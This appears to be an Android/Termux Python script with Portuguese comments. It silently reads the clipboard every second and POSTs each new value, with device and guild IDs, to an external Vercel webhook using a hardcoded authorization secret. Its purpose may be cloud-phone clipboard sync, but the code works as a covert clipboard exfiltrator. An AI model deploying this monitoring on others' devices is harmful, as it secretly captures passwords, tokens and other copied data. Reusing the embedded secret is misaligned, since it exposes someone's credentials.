import sys
import time
import subprocess
import requests

if len(sys.argv) < 3:
    sys.exit(1)

device_id = sys.argv[1]
guild_id = sys.argv[2]
URL_WEBHOOK = "https://hapiephoneugph.vercel.app/api/webhook"
AUTH_SECRET = "ugphoneoficialbrasil13willianz4z4oof$$$pitucho13"

def get_clip_direto():
    try:
        # Puxa o clipboard diretamente da API oculta do Android em modo silencioso
        out = subprocess.check_output("/system/bin/app_process -Djava.class.path=/data/data/com.termux/files/usr/libexec/termux-am/am.apk / com.termux.termuxam.Am clipboard get", shell=True, stderr=subprocess.DEVNULL).decode('utf-8').strip()
        return out
    except:
        # Fallback para o Termux-API caso o comando nativo falhe
        try:
            return subprocess.check_output("termux-clipboard-get", shell=True, stderr=subprocess.DEVNULL).decode('utf-8').strip()
        except:
            return ""

last_clipboard = get_clip_direto()

while True:
    try:
        current_clipboard = get_clip_direto()

        if current_clipboard and current_clipboard != last_clipboard:
            payload = {"texto": current_clipboard, "device_id": device_id, "guild_id": guild_id}
            headers = {"Content-Type": "application/json", "Authorization": AUTH_SECRET}
            
            resp = requests.post(URL_WEBHOOK, json=payload, headers=headers, timeout=5)
            if resp.status_code == 200:
                last_clipboard = current_clipboard
    except:
        pass

    # Checagem ultrarrápida a cada 1 segundo
    time.sleep(1)
